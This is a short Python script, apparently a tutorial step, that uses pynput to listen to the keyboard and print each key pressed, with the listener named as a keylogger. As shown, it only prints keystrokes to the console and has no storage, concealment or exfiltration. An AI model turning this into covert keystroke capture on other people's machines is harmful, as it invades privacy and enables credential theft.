import pynput.keyboard


# creating a listener object and a call back function


# within the callback function, the on press method will forward the keys that are being pressed
def callback_function(key):
    print(key)


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()  # starts the listener
